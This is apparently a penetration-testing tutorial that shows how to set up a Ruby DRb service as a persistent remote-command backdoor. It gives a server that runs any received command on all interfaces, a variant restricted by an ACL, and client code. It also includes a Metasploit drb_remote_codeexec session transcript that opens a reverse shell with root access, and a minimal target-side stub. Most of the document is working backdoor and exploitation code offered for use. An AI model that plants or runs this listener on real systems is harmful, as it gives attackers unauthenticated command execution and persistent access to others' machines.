# RCE as a Service
DRb allows Ruby programs to communicate with each other on the same machine or over a network. DRb uses remote method invocation (RMI) to pass commands and data between processes.

## RCE Service 
```ruby
#!/usr/bin/env ruby
require 'drb'

class RShell
   def exec(cmd)
     `#{cmd}`
   end
end

DRb.start_service("druby://0.0.0.0:8080", RShell.new)
DRb.thread.join
```
Note: It works on all OS platforms 

The `drb` lib supports ACL to prevent/allow particular IP addresses. ex.

```ruby
#!/usr/bin/env ruby
require 'drb'

class RShell
   def exec(cmd)
     `#{cmd}`
   end
end

# Access List
acl = ACL.new(%w{deny all
                allow localhost
                allow 192.168.1.*})
DRb.install_acl(acl)
DRb.start_service("druby://0.0.0.0:8080", RShell.new)
DRb.thread.join
```


## Client 

```ruby
rshell = DRbObject.new_with_uri("druby://192.168.0.13:8080")
puts rshell.exec "id"
```

Or you can use metasploit module to get an elegant shell! 

```bash
msf > use exploit/linux/misc/drb_remote_codeexec 
msf exploit(drb_remote_codeexec) > set URI druby://192.168.0.13:8080
uri => druby://192.168.0.13:8080
msf exploit(drb_remote_codeexec) > exploit 

[*] Started reverse double handler
[*] trying to exploit instance_eval
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo UAR3ld0Uqnc03yNy;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "UAR3ld0Uqnc03yNy\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 2 opened (192.168.0.18:4444 -> 192.168.0.13:57811) at 2015-12-24 01:11:30 +0300

pwd
/root
id
uid=0(root) gid=0(root) groups=0(root)
```
As you can see, even you loose the session you can connect again and again; it's a service, remember? 


Note: For using metasploit module *only*, you don't need even the RShell class. You just need the following on the target side.

```ruby
#!/usr/bin/env ruby
require 'drb'
DRb.start_service("druby://0.0.0.0:8080", []).thread.join
```

I recommend to use the first code in case metasploit is not available.

Read more [technical details](http://blog.recurity-labs.com/archives/2011/05/12/druby_for_penetration_testers/)about the metasploit module "drb_remote_codeexe"